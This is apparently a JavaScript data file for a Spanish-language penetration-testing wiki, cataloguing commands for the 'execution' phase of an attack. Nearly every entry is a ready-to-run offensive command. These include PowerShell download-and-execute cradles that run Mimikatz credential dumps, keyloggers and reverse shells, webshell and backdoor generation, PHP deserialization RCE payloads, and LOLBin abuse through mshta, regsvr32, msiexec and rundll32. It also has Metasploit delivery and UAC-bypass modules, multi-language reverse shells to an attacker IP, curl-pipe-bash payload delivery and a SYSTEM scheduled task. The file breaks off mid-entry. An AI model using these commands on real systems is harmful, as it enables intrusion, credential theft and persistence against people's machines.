// Ejecucion (Execution)
window.WIKI_CHEATSHEETS_04_EXECUTION = [
 {
  "tool": "nishang",
  "desc": "Suite de scripts PowerShell para pentesting y post-explotación",
  "commands": [
   {
    "cmd": "ls /usr/share/nishang/",
    "desc": "Explorar la estructura de Nishang"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress IP -Port 4444\"",
    "desc": "Reverse shell PowerShell"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Download-Execute.ps1');Download-Execute -URL http://IP/evil.exe\"",
    "desc": "Descargar y ejecutar"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\"",
    "desc": "Dump creds con Mimikatz"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254\"",
    "desc": "Portscan"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-Keylogger.ps1');Invoke-Keylogger\"",
    "desc": "Keylogger"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress IP\"",
    "desc": "Reverse shell ICMP"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-PowerShellWmi.ps1');Invoke-PowerShellWmi -Payload 'revshell' -ComputerName TARGET\"",
    "desc": "Ejecución vía WMI"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Get-PassHashes.ps1');Get-PassHashes\"",
    "desc": "Obtener hashes de SAM"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-PoshRat.ps1')",
    "desc": "C2 con PoshRat"
   }
  ]
 },
 {
  "tool": "powersploit",
  "desc": "Colección de módulos PowerShell para post-explotación",
  "commands": [
   {
    "cmd": "ls /usr/share/powersploit/",
    "desc": "Estructura de PowerSploit"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz\"",
    "desc": "Mimikatz desde PS"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-Shellcode.ps1');Invoke-Shellcode -Shellcode (msfvenom shellcode)\"",
    "desc": "Inyectar shellcode"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-PowerShellTcpOneLine.ps1')\"",
    "desc": "Reverse shell one-liner"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Get-GPPPassword.ps1');Get-GPPPassword\"",
    "desc": "Extraer GPP passwords"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-ADSBackdoor.ps1')",
    "desc": "Backdoor en ADS"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Out-EncodedCommand.ps1');Out-EncodedCommand -Command 'whoami'\"",
    "desc": "Comando codificado"
   },
   {
    "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/Get-System.ps1');Get-System\"",
    "desc": "Escalar a SYSTEM"
   }
  ]
 },
 {
  "tool": "evilgrade",
  "desc": "Framework de fake update para ejecutar payloads en actualizaciones",
  "commands": [
   {
    "cmd": "evilgrade -c config",
    "desc": "Iniciar con config"
   },
   {
    "cmd": "evilgrade --show-modules",
    "desc": "Mostrar módulos de agentes"
   },
   {
    "cmd": "evilgrade --module adobe",
    "desc": "Configurar módulo Adobe"
   },
   {
    "cmd": "evilgrade -m adobe -u URL",
    "desc": "URL del payload"
   },
   {
    "cmd": "evilgrade -m java -e cmd",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "evilgrade --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "xsser",
  "desc": "Framework de testing y explotación de XSS",
  "commands": [
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test'",
    "desc": "Test básico"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --auto",
    "desc": "Modo automático"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --cookie='sess=1'",
    "desc": "Con cookie"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --proxy=127.0.0.1:8080",
    "desc": "Con proxy"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --reverse-check",
    "desc": "Comprobar XSS por reflect"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --threads=5",
    "desc": "5 hilos"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --timeout=10",
    "desc": "Timeout"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' -s",
    "desc": "Código de estado"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --heuristic",
    "desc": "Detección heurística"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --xsser-mode",
    "desc": "Modo avanzado"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --payload=xss",
    "desc": "Payload específico"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --Crawler=2",
    "desc": "Crawler profundidad 2"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --drop-cookie",
    "desc": "Sin cookies"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --ignore-proxy",
    "desc": "Ignorar proxy"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --beef --beef-ip IP",
    "desc": "Integración con BeEF"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --dork",
    "desc": "Con dork"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --dtd",
    "desc": "Con DTD"
   },
   {
    "cmd": "xsser -u 'http://objetivo.com/page?q=test' --Bruteforce",
    "desc": "Fuerza bruta de payloads"
   }
  ]
 },
 {
  "tool": "weevely",
  "desc": "Webshell PHP de factoría con cifrado y sesión",
  "commands": [
   {
    "cmd": "weevely generate password /tmp/shell.php",
    "desc": "Generar webshell"
   },
   {
    "cmd": "weevely generate password /tmp/shell.php 'PHP shell'",
    "desc": "Con cabecera custom"
   },
   {
    "cmd": "weevely http://objetivo.com/shell.php password",
    "desc": "Conectarse a la webshell"
   },
   {
    "cmd": "weevely -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "weevely session:upload /etc/passwd",
    "desc": "Subir archivo"
   },
   {
    "cmd": "weevely session:download /etc/passwd",
    "desc": "Descargar archivo"
   },
   {
    "cmd": "weevely session:exec 'id'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "weevely audit:linuxpriv",
    "desc": "Auditoría de privilegios Linux"
   },
   {
    "cmd": "weevely audit:linuxsystem",
    "desc": "Auditoría del sistema"
   },
   {
    "cmd": "weevely file:read /etc/passwd",
    "desc": "Leer archivo"
   },
   {
    "cmd": "weevely file:upload file.txt /var/www/file.txt",
    "desc": "Subir vía session"
   },
   {
    "cmd": "weevely net:portscan 192.168.1.1-254",
    "desc": "Portscan desde el servidor"
   },
   {
    "cmd": "weevely bruteforce:sql -u 'root' -p list.txt",
    "desc": "Fuerza bruta SQL"
   },
   {
    "cmd": "weevely shell:sh",
    "desc": "Shell interactiva"
   },
   {
    "cmd": "weevely shell:su -u root",
    "desc": "Cambiar a root"
   }
  ]
 },
 {
  "tool": "webacoo",
  "desc": "Web Backdoor Cookie - webshell PHP con cookies cifradas",
  "commands": [
   {
    "cmd": "webacoo -g -o backdoor.php",
    "desc": "Generar backdoor"
   },
   {
    "cmd": "webacoo -g -o bd.php -f password",
    "desc": "Con contraseña"
   },
   {
    "cmd": "webacoo -g -o bd.php -e",
    "desc": "Encriptar payload"
   },
   {
    "cmd": "webacoo -t -u http://objetivo.com/bd.php",
    "desc": "Conectarse al backdoor"
   },
   {
    "cmd": "webacoo -t -u http://objetivo.com/bd.php -f password",
    "desc": "Con password"
   },
   {
    "cmd": "webacoo -t -u URL -c 'whoami'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "webacoo -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "laudanum",
  "desc": "Colección de webshells (PHP, ASP, JSP) para múltiples plataformas",
  "commands": [
   {
    "cmd": "ls /usr/share/laudanum/",
    "desc": "Explorar webshells"
   },
   {
    "cmd": "cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.php",
    "desc": "Copiar reverse shell PHP"
   },
   {
    "cmd": "cp /usr/share/laudanum/asp/cmd.aspx ./cmd.aspx",
    "desc": "Webshell ASP"
   },
   {
    "cmd": "cp /usr/share/laudanum/jsp/cmd.jsp ./cmd.jsp",
    "desc": "Webshell JSP"
   },
   {
    "cmd": "grep -r 'IP' /usr/share/laudanum/php/reverse-shell.php",
    "desc": "Configurar IP del reverse shell"
   }
  ]
 },
 {
  "tool": "webshells",
  "desc": "Colección de webshells para diversas plataformas",
  "commands": [
   {
    "cmd": "ls /usr/share/webshells/",
    "desc": "Explorar colección"
   },
   {
    "cmd": "ls /usr/share/webshells/php/",
    "desc": "Webshells PHP"
   },
   {
    "cmd": "ls /usr/share/webshells/asp/",
    "desc": "Webshells ASP"
   },
   {
    "cmd": "ls /usr/share/webshells/jsp/",
    "desc": "Webshells JSP"
   },
   {
    "cmd": "ls /usr/share/webshells/perl/",
    "desc": "Webshells Perl"
   },
   {
    "cmd": "cat /usr/share/webshells/php/php-reverse-shell.php | sed 's/127.0.0.1/IP/' > shell.php",
    "desc": "Configurar reverse shell"
   }
  ]
 },
 {
  "tool": "phpggc",
  "desc": "Generador de payloads PHP deserialization (gadget chains)",
  "commands": [
   {
    "cmd": "phpggc -l",
    "desc": "Listar gadget chains"
   },
   {
    "cmd": "phpggc Laravel/RCE1 system 'id'",
    "desc": "Generar payload Laravel RCE"
   },
   {
    "cmd": "phpggc Symfony/RCE4 exec 'id'",
    "desc": "Symfony RCE"
   },
   {
    "cmd": "phpggc Wordpress/RCE1 system 'id'",
    "desc": "WordPress RCE"
   },
   {
    "cmd": "phpggc -s Laravel/RCE1 system 'id'",
    "desc": "Generar serializado"
   },
   {
    "cmd": "phpggc -b Laravel/RCE1 system 'id'",
    "desc": "Base64 encode"
   },
   {
    "cmd": "phpggc -u Laravel/RCE1 system 'id'",
    "desc": "URL encode"
   },
   {
    "cmd": "phpggc -j Laravel/RCE1 system 'id'",
    "desc": "JSON encode"
   },
   {
    "cmd": "phpggc -p phar Laravel/RCE1 system 'id'",
    "desc": "PHAR payload"
   },
   {
    "cmd": "phpggc -o /tmp/payload.txt Laravel/RCE1 system 'id'",
    "desc": "Guardar en archivo"
   },
   {
    "cmd": "phpggc --fast-destruct Laravel/RCE1 system 'id'",
    "desc": "Con fast destruct"
   },
   {
    "cmd": "phpggc --php 5.6 Laravel/RCE1 system 'id'",
    "desc": "Versión PHP específica"
   }
  ]
 },
 {
  "tool": "powershell-empire",
  "desc": "Post-explotación PowerShell (Empire)",
  "commands": [
   {
    "cmd": "powershell-empire server",
    "desc": "Iniciar servidor"
   },
   {
    "cmd": "powershell-empire client",
    "desc": "Cliente"
   },
   {
    "cmd": "powershell-empire server --rest-port 1337",
    "desc": "Puerto REST"
   },
   {
    "cmd": "powershell-empire server --username user --password pass",
    "desc": "Credenciales"
   },
   {
    "cmd": "powershell-empire server --socket-port 5050",
    "desc": "Socket port"
   },
   {
    "cmd": "powershell-empire server --api -v",
    "desc": "Verbose"
   },
   {
    "cmd": "powershell-empire server --config config.yaml",
    "desc": "Config"
   },
   {
    "cmd": "powershell-empire client -s localhost",
    "desc": "Server"
   },
   {
    "cmd": "powershell-empire client -p 1337",
    "desc": "Puerto"
   },
   {
    "cmd": "powershell-empire --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "phpsploit",
  "desc": "Webshell PHP con framework de comandos",
  "commands": [
   {
    "cmd": "phpsploit",
    "desc": "Abrir consola"
   },
   {
    "cmd": "phpsploit -e 'set PAYLOAD file:/tmp/shell.php'",
    "desc": "Cargar payload"
   },
   {
    "cmd": "phpsploit -e 'set TARGET URL'",
    "desc": "URL"
   },
   {
    "cmd": "phpsploit -e 'exploit'",
    "desc": "Explotar"
   },
   {
    "cmd": "phpsploit -e 'interact'",
    "desc": "Interactuar"
   },
   {
    "cmd": "phpsploit -e 'shell'",
    "desc": "Shell"
   },
   {
    "cmd": "phpsploit -e 'shell whoami'",
    "desc": "Comando"
   },
   {
    "cmd": "phpsploit -e 'set INTERFACE tcp'",
    "desc": "Interfaz"
   },
   {
    "cmd": "phpsploit -e 'set BACKDOOR cmd'",
    "desc": "Backdoor"
   },
   {
    "cmd": "phpsploit -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "shellsploit",
  "desc": "Framework de shells/payloads para explotación",
  "commands": [
   {
    "cmd": "shellsploit",
    "desc": "Abrir"
   },
   {
    "cmd": "shellsploit -l",
    "desc": "Listar payloads"
   },
   {
    "cmd": "shellsploit -p windows/x64/shell_reverse_tcp",
    "desc": "Seleccionar payload"
   },
   {
    "cmd": "shellsploit -e x86/shikata_ga_nai",
    "desc": "Encoder"
   },
   {
    "cmd": "shellsploit -g LHOST=IP -p payload",
    "desc": "Generar"
   },
   {
    "cmd": "shellsploit -o out.bin -g payload",
    "desc": "Salida"
   },
   {
    "cmd": "shellsploit -f exe -g payload",
    "desc": "Formato"
   },
   {
    "cmd": "shellsploit -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "mshta-exec",
  "desc": "Ejecución de código vía mshta.exe (HTA)",
  "commands": [
   {
    "cmd": "mshta http://IP/payload.hta",
    "desc": "Ejecutar HTA remoto"
   },
   {
    "cmd": "mshta javascript:alert(1)",
    "desc": "Ejecutar JS"
   },
   {
    "cmd": "mshta vbscript:Execute(\"MsgBox 1\")",
    "desc": "VBScript"
   },
   {
    "cmd": "mshta \\\\\\\\IP\\\\share\\\\file.hta",
    "desc": "UNC path"
   },
   {
    "cmd": "mshta file:///C:\\\\temp\\\\x.hta",
    "desc": "Local"
   },
   {
    "cmd": "mshta \"about:<script>...</script>\"",
    "desc": "HTML inline"
   },
   {
    "cmd": "powershell -c 'Invoke-Item x.hta'",
    "desc": "Invoke-Item"
   },
   {
    "cmd": "mshta /? ",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "regsvr32-exec",
  "desc": "Ejecución de código vía regsvr32 (Squiblydoo)",
  "commands": [
   {
    "cmd": "regsvr32 /s /u /i:http://IP/x.sct scrobj.dll",
    "desc": "Squiblydoo"
   },
   {
    "cmd": "regsvr32 /s /n /u /i:http://IP/x.sct scrobj.dll",
    "desc": "Sin registro"
   },
   {
    "cmd": "regsvr32 /i:file.sct scrobj.dll",
    "desc": "SCT local"
   },
   {
    "cmd": "regsvr32 /s payload.dll",
    "desc": "Registrar DLL"
   },
   {
    "cmd": "regsvr32 /u payload.dll",
    "desc": "Desregistrar"
   },
   {
    "cmd": "regsvr32 /n /i:https://IP/x.sct scrobj.dll",
    "desc": "HTTPS"
   },
   {
    "cmd": "regsvr32 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "msiexec-exec",
  "desc": "Ejecución vía MSI (Msiexec)",
  "commands": [
   {
    "cmd": "msiexec /i http://IP/install.msi /quiet",
    "desc": "Instalar MSI remoto"
   },
   {
    "cmd": "msiexec /i payload.msi /qn /norestart",
    "desc": "Silencioso"
   },
   {
    "cmd": "msiexec /q /i payload.msi",
    "desc": "Quiet"
   },
   {
    "cmd": "msiexec /a payload.msi",
    "desc": "Admin install"
   },
   {
    "cmd": "msiexec /x payload.msi",
    "desc": "Desinstalar"
   },
   {
    "cmd": "msiexec /y payload.dll",
    "desc": "Ejecutar DLL"
   },
   {
    "cmd": "msiexec /z payload.dll",
    "desc": "Ejecutar DLL admin"
   },
   {
    "cmd": "msiexec /i payload.msi /l*v log.txt",
    "desc": "Con log"
   },
   {
    "cmd": "msiexec /i payload.msi TRANSFORMS=file.mst",
    "desc": "Transform"
   },
   {
    "cmd": "msiexec -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "rundll32-exec",
  "desc": "Ejecución de código vía rundll32",
  "commands": [
   {
    "cmd": "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
    "desc": "JS inline"
   },
   {
    "cmd": "rundll32 url.dll,FileProtocolHandler http://IP",
    "desc": "Abrir URL"
   },
   {
    "cmd": "rundll32 shell32.dll,ShellExec_RunDLL cmd.exe",
    "desc": "Ejecutar cmd"
   },
   {
    "cmd": "rundll32 javascript:\\..\\mshtml,RunHTMLApplication ;cmd.exe",
    "desc": "HTML app"
   },
   {
    "cmd": "rundll32 advpack.dll,LaunchINFSection x.inf",
    "desc": "INF section"
   },
   {
    "cmd": "rundll32 control.exe,RunDLL",
    "desc": "Panel"
   },
   {
    "cmd": "rundll32 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "cscript-exec",
  "desc": "Ejecución vía Windows Script Host",
  "commands": [
   {
    "cmd": "cscript script.vbs",
    "desc": "Ejecutar VBS"
   },
   {
    "cmd": "cscript //nologo script.js",
    "desc": "JS sin logo"
   },
   {
    "cmd": "cscript //e:vbscript script.txt",
    "desc": "Forzar engine"
   },
   {
    "cmd": "cscript //B script.vbs",
    "desc": "Batch mode"
   },
   {
    "cmd": "cscript //T:30 script.vbs",
    "desc": "Timeout"
   },
   {
    "cmd": "cscript //D script.vbs",
    "desc": "Debug"
   },
   {
    "cmd": "cscript wscript.shell script.vbs",
    "desc": "Shell object"
   },
   {
    "cmd": "cscript //h:CScript",
    "desc": "Default host"
   },
   {
    "cmd": "cscript -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wmic-exec",
  "desc": "Ejecución vía WMI (wmic xsl stylesheet)",
  "commands": [
   {
    "cmd": "wmic os get /format:http://IP/x.xsl",
    "desc": "XSL execution"
   },
   {
    "cmd": "wmic process call create 'cmd.exe /c whoami'",
    "desc": "Crear proceso"
   },
   {
    "cmd": "wmic process list",
    "desc": "Listar procesos"
   },
   {
    "cmd": "wmic process where name=\"chrome.exe\" get processid",
    "desc": "PID de proceso"
   },
   {
    "cmd": "wmic service get name,pathname",
    "desc": "Servicios"
   },
   {
    "cmd": "wmic startup list full",
    "desc": "Startup"
   },
   {
    "cmd": "wmic product get name",
    "desc": "Software"
   },
   {
    "cmd": "wmic useraccount list",
    "desc": "Usuarios"
   },
   {
    "cmd": "wmic share list",
    "desc": "Shares"
   },
   {
    "cmd": "wmic qfe list",
    "desc": "Patches"
   },
   {
    "cmd": "wmic nicconfig get ipaddress",
    "desc": "IPs"
   },
   {
    "cmd": "wmic /node:IP process call create 'cmd'",
    "desc": "Remoto"
   },
   {
    "cmd": "wmic /user:user /password:pass /node:IP process call create 'whoami'",
    "desc": "Remoto con creds"
   },
   {
    "cmd": "wmic -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "php-reverse-tools",
  "desc": "Webshells y reverse shells PHP",
  "commands": [
   {
    "cmd": "php -r '$sock=fsockopen(\"IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "desc": "Reverse shell"
   },
   {
    "cmd": "php -r 'system(\"id\");'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "php -r '$c=$_GET[\"c\"];system($c);' > shell.php",
    "desc": "Webshell GET"
   },
   {
    "cmd": "php -r 'eval($_POST[\"c\"]);' > shell.php",
    "desc": "Webshell POST"
   },
   {
    "cmd": "php -r 'file_put_contents(\"shell.php\", \"<?php system(\\$_GET[\"c\"]); ?>\")'",
    "desc": "Crear webshell"
   },
   {
    "cmd": "php -i | grep -i 'disable_functions'",
    "desc": "Disable functions"
   },
   {
    "cmd": "php -r 'echo base64_decode(\"PD9waHAg...\");'",
    "desc": "Decodificar"
   },
   {
    "cmd": "php -r 'print_r(scandir(\".\"));'",
    "desc": "Listar dir"
   },
   {
    "cmd": "php -r 'echo file_get_contents(\"/etc/passwd\");'",
    "desc": "Leer archivo"
   },
   {
    "cmd": "php -r 'system(\"nc IP 4444 -e /bin/bash\");'",
    "desc": "NC reverse"
   },
   {
    "cmd": "php -r '$p=proc_open(\"/bin/bash\",[0=>[\"pipe\",\"r\"],1=>[\"pipe\",\"w\"],2=>[\"pipe\",\"w\"]],$p);'",
    "desc": "Proc open"
   },
   {
    "cmd": "php -r 'print_r(get_defined_functions());'",
    "desc": "Funciones"
   },
   {
    "cmd": "php -r 'echo php_uname();'",
    "desc": "Sistema"
   },
   {
    "cmd": "php -r 'var_dump(ini_get_all());'",
    "desc": "PHP ini"
   }
  ]
 },
 {
  "tool": "msf-exec-modules",
  "desc": "Módulos de ejecución de Metasploit",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/script/web_delivery; set TARGET 1; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Web delivery Linux"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/script/web_delivery; set TARGET 0; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Web delivery Win"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/misc/hta_server; set SRVHOST IP; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "HTA server"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/fileformat/office_word_hta; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Word HTA"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/local/bypassuac_fodhelper; set SESSION 1; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Bypass UAC"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/manage/shell_to_meterpreter; set SESSION 1; run'",
    "desc": "Shell a meterpreter"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/wp_admin_shell_upload; set RHOSTS IP; set USERNAME admin; set PASSWORD pass; run'",
    "desc": "WP shell"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/gitlab_exif_rce; set RHOSTS IP; run'",
    "desc": "GitLab RCE"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/jenkins_script_console; set RHOSTS IP; set TARGET 0; run'",
    "desc": "Jenkins"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS IP; set USERNAME tomcat; set PASSWORD tomcat; run'",
    "desc": "Tomcat upload"
   }
  ]
 },
 {
  "tool": "exec-one-liners",
  "desc": "One-liners de ejecución (bash, python, perl, ruby)",
  "commands": [
   {
    "cmd": "bash -i >& /dev/tcp/IP/4444 0>&1",
    "desc": "Bash reverse"
   },
   {
    "cmd": "bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'",
    "desc": "Bash -c"
   },
   {
    "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "desc": "Python reverse"
   },
   {
    "cmd": "python2 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "desc": "Python2"
   },
   {
    "cmd": "perl -e 'use Socket;$i=\"IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "desc": "Perl reverse"
   },
   {
    "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"IP\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "desc": "Ruby reverse"
   },
   {
    "cmd": "nc -e /bin/sh IP 4444",
    "desc": "NC -e"
   },
   {
    "cmd": "socat TCP:IP:4444 EXEC:/bin/sh",
    "desc": "Socat"
   },
   {
    "cmd": "php -r '$sock=fsockopen(\"IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "desc": "PHP"
   },
   {
    "cmd": "openssl s_client -quiet -connect IP:4444 & /bin/sh",
    "desc": "OpenSSL"
   },
   {
    "cmd": "telnet IP 4444 | /bin/bash | telnet IP 5555",
    "desc": "Telnet pipe"
   },
   {
    "cmd": "awk 'BEGIN {s=\"/inet/tcp/0/IP/4444\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c!=\"exit\") close(s); }}'",
    "desc": "Awk reverse"
   },
   {
    "cmd": "xterm -display IP:1",
    "desc": "X11"
   },
   {
    "cmd": "gdb -nx -ex 'python import os; os.system(\"/bin/sh\")'",
    "desc": "Gdb exec"
   }
  ]
 },
 {
  "tool": "payload-deploy",
  "desc": "Despliegue de payloads (servidores de delivery)",
  "commands": [
   {
    "cmd": "python3 -m http.server 80",
    "desc": "Servir files"
   },
   {
    "cmd": "php -S 0.0.0.0:80 -t /tmp/www",
    "desc": "PHP serve"
   },
   {
    "cmd": "ncat -lvnp 80 --send-only --ssl -k",
    "desc": "Ncat ssl"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/script/web_delivery; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; set SRVHOST IP; set URIPATH /p; run'",
    "desc": "Web delivery"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/tftp; set SRVHOST IP; set TFTPROOT /tmp; run'",
    "desc": "TFTP"
   },
   {
    "cmd": "smbclient //IP/share -U user%pass -c 'put /tmp/payload.exe'",
    "desc": "SMB share"
   },
   {
    "cmd": "curl -T payload.exe ftp://user:pass@IP/",
    "desc": "FTP upload"
   },
   {
    "cmd": "wget http://IP/payload -O /tmp/p",
    "desc": "Download target"
   },
   {
    "cmd": "curl -s http://IP/payload -o /tmp/p && chmod +x /tmp/p && /tmp/p",
    "desc": "One-liner"
   },
   {
    "cmd": "base64 -w0 payload > b64 && cat b64 | ssh user@IP 'base64 -d > /tmp/p && chmod +x /tmp/p && /tmp/p'",
    "desc": "Base64 ssh"
   },
   {
    "cmd": "scp payload user@IP:/tmp/",
    "desc": "SCP"
   },
   {
    "cmd": "nc -w3 IP 80 < payload",
    "desc": "NC upload"
   },
   {
    "cmd": "python3 -c 'import http.server, socketserver; socketserver.TCPServer((\"0.0.0.0\", 8080), http.server.SimpleHTTPRequestHandler).serve_forever()'",
    "desc": "Py http"
   },
   {
    "cmd": "python3 -c 'import socket;s=socket.socket();s.connect((\"IP\",80));s.sendall(open(\"/tmp/p\",\"rb\").read())'",
    "desc": "Raw upload"
   },
   {
    "cmd": "curl -s --data-binary @payload http://IP/upload",
    "desc": "HTTP upload"
   }
  ]
 },
 {
  "tool": "scripting-exec",
  "desc": "Ejecución vía scripting (bash, PS, wmic)",
  "commands": [
   {
    "cmd": "bash /tmp/payload.sh",
    "desc": "Bash script"
   },
   {
    "cmd": "sh -c '/tmp/payload'",
    "desc": "Sh -c"
   },
   {
    "cmd": "powershell -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://IP/p.ps1\")'",
    "desc": "PS IEX"
   },
   {
    "cmd": "powershell -enc BASE64",
    "desc": "PS encoded"
   },
   {
    "cmd": "powershell -c 'Start-Process -FilePath C:\\\\x.exe'",
    "desc": "PS start"
   },
   {
    "cmd": "powershell -w hidden -c 'whoami'",
    "desc": "PS hidden"
   },
   {
    "cmd": "powershell -ep bypass -f /tmp/p.ps1",
    "desc": "PS bypass"
   },
   {
    "cmd": "wmic process call create 'cmd.exe /c whoami'",
    "desc": "WMIC"
   },
   {
    "cmd": "cmd /c 'echo x > C:\\\\t.txt'",
    "desc": "Cmd"
   },
   {
    "cmd": "certutil -urlcache -f http://IP/p.exe p.exe",
    "desc": "Certutil"
   },
   {
    "cmd": "regsvr32 /s /n /u /i:http://IP/x.sct scrobj.dll",
    "desc": "Regsvr32"
   },
   {
    "cmd": "mshta http://IP/p.hta",
    "desc": "Mshta"
   },
   {
    "cmd": "rundll32 javascript:\\\\..\\\\mshtml,RunHTMLApplication http://IP/p",
    "desc": "Rundll32"
   },
   {
    "cmd": "python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"http://IP/p.py\").read())'",
    "desc": "Py remote"
   },
   {
    "cmd": "curl -s http://IP/p.sh | bash",
    "desc": "Curl pipe"
   },
   {
    "cmd": "wget -qO- http://IP/p.sh | sh",
    "desc": "Wget pipe"
   },
   {
    "cmd": "perl -e 'system(\"wget http://IP/p -O /tmp/p && /tmp/p\")'",
    "desc": "Perl exec"
   }
  ]
 },
 {
  "tool": "scheduled-exec",
  "desc": "Ejecución programada (tareas y servicios)",
  "commands": [
   {
    "cmd": "schtasks /create /tn x /tr 'cmd /c payload.exe' /sc onlogon /ru SYSTEM",
